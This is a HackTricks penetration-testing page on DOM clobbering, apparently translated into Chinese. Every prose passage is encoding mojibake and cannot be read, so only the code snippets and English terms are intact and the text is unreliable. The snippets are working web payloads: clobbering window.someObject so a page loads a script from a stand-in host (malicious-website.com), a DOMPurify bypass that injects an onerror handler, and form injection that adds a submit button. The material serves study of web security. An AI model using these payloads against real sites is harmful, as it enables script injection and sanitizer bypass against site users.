# Dom Clobbering

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **åŸºç¡€çŸ¥è¯†**

å¯ä»¥é€šè¿‡åœ¨HTMLæ ‡ç­¾ä¸­ä½¿ç”¨**`id`**å’Œ**`name`**å±æ€§æ¥ç”Ÿæˆ**JSä¸Šä¸‹æ–‡ä¸­çš„å…¨å±€å˜é‡**ã€‚
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
åªæœ‰ç‰¹å®šçš„å…ƒç´ å¯ä»¥ä½¿ç”¨`name`å±æ€§æ¥è¦†ç›–å…¨å±€å˜é‡ï¼Œå®ƒä»¬æ˜¯ï¼š`embed`ã€`form`ã€`iframe`ã€`image`ã€`img`å’Œ`object`ã€‚

æœ‰è¶£çš„æ˜¯ï¼Œå½“ä½ ä½¿ç”¨`form`å…ƒç´ æ¥è¦†ç›–ä¸€ä¸ªå˜é‡æ—¶ï¼Œä½ å°†å¾—åˆ°å…ƒç´ æœ¬èº«çš„`toString`å€¼ï¼š`[object HTMLFormElement]`ï¼Œä½†æ˜¯ä½¿ç”¨`anchor`æ—¶ï¼Œ`toString`å°†æ˜¯é”šç‚¹çš„`href`ã€‚å› æ­¤ï¼Œå¦‚æœä½ ä½¿ç”¨`a`æ ‡ç­¾æ¥è¦†ç›–ï¼Œä½ å¯ä»¥åœ¨å®ƒè¢«è§†ä¸ºå­—ç¬¦ä¸²æ—¶æ§åˆ¶å®ƒçš„å€¼ï¼š
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### æ•°ç»„å’Œå±æ€§

è¿˜å¯ä»¥**è¦†ç›–æ•°ç»„**å’Œ**å¯¹è±¡å±æ€§**ï¼š
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
è¦è¦†ç›–ç¬¬ä¸‰ä¸ªå±æ€§ï¼ˆä¾‹å¦‚x.y.zï¼‰ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ä¸€ä¸ª`form`ï¼š
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
è¦†ç›–æ›´å¤šå±æ€§**æ›´åŠ å¤æ‚ä½†ä»ç„¶å¯è¡Œ**ï¼Œä½¿ç”¨iframesï¼š
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
ä½¿ç”¨styleæ ‡ç­¾å¯ä»¥ç»™iframeè¶³å¤Ÿçš„æ—¶é—´æ¥æ¸²æŸ“ã€‚å¦‚æœæ²¡æœ‰å®ƒï¼Œä½ ä¼šçœ‹åˆ°ä¸€ä¸ªæœªå®šä¹‰çš„è­¦å‘Šã€‚
{% endhint %}

è¦æ·±å±‚è¦†ç›–å±æ€§ï¼Œå¯ä»¥ä½¿ç”¨å¸¦æœ‰HTMLç¼–ç çš„iframeï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **ç»•è¿‡è¿‡æ»¤å™¨**

å¦‚æœä¸€ä¸ªè¿‡æ»¤å™¨æ­£åœ¨ä½¿ç”¨ç±»ä¼¼ `document.getElementByID('x').attributes` çš„æ–¹å¼å¾ªç¯éå†èŠ‚ç‚¹çš„å±æ€§ï¼Œä½ å¯ä»¥**è¦†ç›–**å±æ€§**`.attributes`**å¹¶**ç ´åè¿‡æ»¤å™¨**ã€‚å…¶ä»–å¯è¢«**è¦†ç›–**çš„ DOM å±æ€§åŒ…æ‹¬**`tagName`**ã€**`nodeName`**ã€**`parentNode`**ç­‰ã€‚
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **è¦†ç›– `window.someObject`**

JavaScriptå¼€å‘äººå‘˜å¸¸ç”¨çš„ä¸€ç§æ¨¡å¼æ˜¯ï¼š
```javascript
var someObject = window.someObject || {};
```
å¦‚æœæ‚¨å¯ä»¥æ§åˆ¶é¡µé¢ä¸Šçš„ä¸€äº›HTMLï¼Œæ‚¨å¯ä»¥ä½¿ç”¨DOMèŠ‚ç‚¹ï¼ˆä¾‹å¦‚é”šç‚¹ï¼‰è¦†ç›–`someObject`å¼•ç”¨ã€‚è€ƒè™‘ä»¥ä¸‹ä»£ç ï¼š
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæœ‰æ¼æ´çš„ä»£ç ï¼Œä½ å¯ä»¥æ³¨å…¥ä»¥ä¸‹HTMLä»£ç æ¥è¦†ç›–`someObject`å¼•ç”¨ï¼Œä½¿ç”¨ä¸€ä¸ªé”šç‚¹å…ƒç´ ï¼š

{% code overflow="wrap" %}
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```
{% endcode %}

æ³¨å…¥çš„æ•°æ® **`window.someObject.url`** å°†å˜ä¸º `href=//malicious-website.com/malicious.js`

**æŠ€å·§**ï¼š**`DOMPurify`** å…è®¸æ‚¨ä½¿ç”¨ **`cid:`** åè®®ï¼Œè¯¥åè®®**ä¸ä¼šå¯¹åŒå¼•å·è¿›è¡Œ URL ç¼–ç **ã€‚è¿™æ„å‘³ç€æ‚¨å¯ä»¥**æ³¨å…¥ä¸€ä¸ªç¼–ç çš„åŒå¼•å·ï¼Œåœ¨è¿è¡Œæ—¶è§£ç **ã€‚å› æ­¤ï¼Œæ³¨å…¥ç±»ä¼¼äº **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** çš„å†…å®¹å°†ä½¿ HTML ç¼–ç çš„ `&quot;` åœ¨è¿è¡Œæ—¶**è§£ç å¹¶ä»å±æ€§å€¼ä¸­è½¬ä¹‰**ï¼Œä»è€Œåˆ›å»º **`onerror`** äº‹ä»¶ã€‚

å¦ä¸€ç§å¸¸è§çš„æŠ€æœ¯æ˜¯ä½¿ç”¨ **`form`** å…ƒç´ ã€‚ä¸€äº›å®¢æˆ·ç«¯åº“å°†éå†åˆ›å»ºçš„è¡¨å•å…ƒç´ çš„å±æ€§è¿›è¡Œæ¸…ç†ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨åœ¨è¡¨å•å†…åˆ›å»ºä¸€ä¸ªå…·æœ‰ `id=attributes` çš„ `input`ï¼Œæ‚¨å°†**è¦†ç›–å±æ€§å±æ€§**ï¼Œè€Œæ¸…ç†å™¨å°†**æ— æ³•éå†çœŸå®å±æ€§**ã€‚

æ‚¨å¯ä»¥åœ¨[**æ­¤ CTF writeup ä¸­æ‰¾åˆ°æ­¤ç±»è¦†ç›–çš„ç¤ºä¾‹**](iframes-in-xss-and-csp.md#iframes-in-sop-2)ã€‚

## è¦†ç›– document å¯¹è±¡

æ ¹æ®æ–‡æ¡£ï¼Œå¯ä»¥ä½¿ç”¨ DOM è¦†ç›–æ¥è¦†ç›– document å¯¹è±¡çš„å±æ€§ï¼š

> [Document](https://html.spec.whatwg.org/multipage/dom.html#document) æ¥å£[æ”¯æŒå‘½åå±æ€§](https://webidl.spec.whatwg.org/#dfn-support-named-properties)ã€‚[Document](https://html.spec.whatwg.org/multipage/dom.html#document) å¯¹è±¡çš„[æ”¯æŒçš„å±æ€§åç§°](https://webidl.spec.whatwg.org/#dfn-supported-property-names)åœ¨ä»»ä½•æ—¶åˆ»éƒ½åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼ŒæŒ‰ç…§è´¡çŒ®å®ƒä»¬çš„å…ƒç´ çš„[æ ‘é¡ºåº](https://dom.spec.whatwg.org/#concept-tree-order)æ’åˆ—ï¼Œå¿½ç•¥åç»­çš„é‡å¤é¡¹ï¼Œå¹¶ä¸”åœ¨ç›¸åŒå…ƒç´ åŒæ—¶è´¡çŒ® id å±æ€§å’Œ name å±æ€§æ—¶ï¼Œä½¿ç”¨æ¥è‡ª id å±æ€§çš„å€¼ä¼˜å…ˆäºæ¥è‡ª name å±æ€§çš„å€¼ï¼š
>
> \- æ‰€æœ‰å…·æœ‰éç©º name å†…å®¹å±æ€§å¹¶ä¸”åœ¨æ–‡æ¡£æ ‘ä¸­ä¸æ–‡æ¡£ä½œä¸ºå…¶[æ ¹](https://dom.spec.whatwg.org/#concept-tree-root)çš„[å…¬å¼€](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element)ã€[form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element)ã€[iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)ã€[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) å’Œ[å…¬å¼€](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) å…ƒç´ çš„ name å†…å®¹å±æ€§çš„å€¼ï¼›\
> \
> \- æ‰€æœ‰å…·æœ‰éç©º [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å†…å®¹å±æ€§å¹¶ä¸”åœ¨æ–‡æ¡£æ ‘ä¸­ä¸æ–‡æ¡£ä½œä¸ºå…¶[æ ¹](https://dom.spec.whatwg.org/#concept-tree-root)çš„[å…¬å¼€](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) å…ƒç´ çš„ id å†…å®¹å±æ€§çš„å€¼ï¼›\
> \
> \- æ‰€æœ‰å…·æœ‰åŒæ—¶å…·æœ‰éç©º [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å†…å®¹å±æ€§å’Œéç©º name å†…å®¹å±æ€§çš„[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) å…ƒç´ çš„ id å†…å®¹å±æ€§çš„å€¼ï¼Œå¹¶ä¸”åœ¨æ–‡æ¡£æ ‘ä¸­ä¸æ–‡æ¡£ä½œä¸ºå…¶[æ ¹](https://dom.spec.whatwg.org/#concept-tree-root)ã€‚

ä½¿ç”¨æ­¤æŠ€æœ¯ï¼Œæ‚¨å¯ä»¥è¦†ç›–å¸¸ç”¨çš„**å€¼ï¼Œå¦‚ `document.cookie`ã€`document.body`ã€`document.children`**ï¼Œç”šè‡³å¯ä»¥è¦†ç›– Document æ¥å£ä¸­çš„æ–¹æ³•ï¼Œå¦‚ `document.querySelector`ã€‚
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## åœ¨å…ƒç´ è¢«è¦†ç›–åå†™å…¥

å¦‚æœæ‚¨æ³¨å…¥å…·æœ‰ç›¸åŒidå±æ€§çš„`<html>`æˆ–`<body>`æ ‡ç­¾ï¼Œæ‚¨å¯ä»¥è¦†ç›–**`document.getElementById()`**å’Œ**`document.querySelector()`**è°ƒç”¨çš„ç»“æœã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š
```html
<div style=display:none id=cdnDomain class=x>test</div>
<p>
<html id="cdnDomain" class=x>clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
alert(document.querySelector('.x').innerText);//clobbbered
</script>
```
è¿˜æœ‰ä¸€ä¸ªæœ‰è¶£çš„åœ°æ–¹æ˜¯ï¼Œä½ å¯ä»¥ä»`innerText`ä¸­**éšè—å…ƒç´ **ï¼Œå› æ­¤å¦‚æœä½ æ³¨å…¥ä¸€ä¸ªHTML/bodyæ ‡ç­¾ï¼Œä½ å¯ä»¥ä½¿ç”¨æ ·å¼å°†å…¶ä»`innerText`ä¸­éšè—èµ·æ¥ï¼Œä»¥é˜²æ­¢å…¶ä»–æ–‡æœ¬å¹²æ‰°ä½ çš„æ”»å‡»ï¼š
```html
<div style=display:none id=cdnDomain>test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
</script>
```
æˆ‘ä»¬ä¹Ÿç ”ç©¶äº†SVGï¼Œå¯ä»¥åœ¨å…¶ä¸­ä½¿ç”¨`<body>`æ ‡ç­¾ï¼š
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg><body id=cdnDomain>clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
ä½ éœ€è¦ä¸€ä¸ª`<foreignobject>`æ ‡ç­¾æ‰èƒ½åœ¨Chromeå’ŒFirefoxä¸Šä½¿ç”¨SVGå†…éƒ¨çš„HTMLæ ‡ç­¾ï¼š
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg>
<foreignobject>
<html id=cdnDomain>clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
## è¦†ç›–è¡¨å•

é€šè¿‡åœ¨æŸäº›æ ‡ç­¾ä¸­æŒ‡å®š`form`å±æ€§ï¼Œå¯ä»¥åœ¨è¡¨å•ä¸­æ·»åŠ æ–°æ¡ç›®ã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½åœ¨è¡¨å•ä¸­æ·»åŠ æ–°å€¼ï¼Œç”šè‡³å¯ä»¥æ·»åŠ ä¸€ä¸ªæ–°çš„æŒ‰é’®æ¥å‘é€å®ƒï¼ˆç‚¹å‡»åŠ«æŒæˆ–æ»¥ç”¨ä¸€äº›`.click()`çš„JSä»£ç ï¼‰ï¼š

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* æœ‰å…³æ›´å¤š[**æŒ‰é’®çš„å±æ€§ï¼Œè¯·æŸ¥çœ‹æ­¤å¤„**](https://www.w3schools.com/tags/tag\_button.asp)**ã€‚**

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
